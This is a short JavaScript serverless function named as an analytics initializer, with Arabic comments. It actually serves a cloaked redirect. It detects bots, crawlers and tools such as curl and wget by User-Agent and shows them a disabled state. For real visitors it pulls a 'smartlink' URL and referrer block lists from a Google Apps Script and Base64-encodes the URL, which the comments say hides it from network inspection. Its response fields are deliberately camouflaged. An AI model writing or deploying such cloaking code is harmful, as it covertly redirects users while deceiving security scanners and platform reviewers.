// functions/api/analytics/init.js

const GOOGLE_SHEET_API = 'https://script.google.com/macros/s/AKfycbzNl9z7w0qqwMzAeUuv8CniCCggRzD9eTc-sM34hDP76NxNpYXZVNqYBct4W9APFisCjg/exec'; // رابط V8

const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
};

// قائمة الكلمات المفتاحية للروبوتات وشبكات الفحص
const botPatterns = /bot|crawler|spider|headless|chrome-lighthouse|python|curl|wget|node-fetch/i;

export async function onRequestOptions() {
    return new Response(null, { status: 204, headers: corsHeaders });
}

export async function onRequestGet(context) {
    const request = context.request;
    const userAgent = request.headers.get('User-Agent') || '';

    // 🛡️ جدار الحماية: إذا كان الطلب من روبوت، أرجع له أن التحويل مغلق (OFF) ورابط فارغ
    if (botPatterns.test(userAgent)) {
        return new Response(JSON.stringify({ s: 0, u: '', b: '', e: '' }), {
            status: 200, headers: { 'Content-Type': 'application/json', ...corsHeaders }
        });
    }

    try {
        // جلب الإعدادات من جوجل شيت
        const response = await fetch(`${GOOGLE_SHEET_API}?action=getConfig`);
        const data = await response.json();
        
        // تشفير الرابط (Base64) قبل إرساله للمتصفح لإخفائه عن فحص الشبكة
        let encodedUrl = '';
        if (data.status === 'ON' && data.smartlinkUrl) {
            encodedUrl = btoa(data.smartlinkUrl);
        }

        // إرجاع البيانات بمسميات مموهة (s = status, u = url, b = broad, e = exact)
        return new Response(JSON.stringify({ 
            s: data.status === 'ON' ? 1 : 0, 
            u: encodedUrl,
            b: data.blockedReferrers || '',
            e: data.blockedExactReferrers || ''
        }), {
            status: 200, headers: { 'Content-Type': 'application/json', ...corsHeaders }
        });
    } catch (error) {
        return new Response(JSON.stringify({ s: 0, u: '', b: '', e: '' }), {
            status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders }
        });
    }
}